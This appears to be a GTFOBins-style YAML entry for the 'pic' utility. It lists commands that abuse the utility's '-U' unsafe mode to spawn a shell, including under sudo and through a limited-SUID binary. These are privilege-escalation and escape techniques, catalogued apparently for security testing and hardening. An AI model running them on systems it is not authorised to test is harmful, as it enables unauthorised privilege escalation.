---
functions:
  shell:
    - code: |
        pic -U
        .PS
        sh X sh X
  sudo:
    - code: |
        sudo pic -U
        .PS
        sh X sh X
  limited-suid:
    - code: |
        ./pic -U
        .PS
        sh X sh X
---
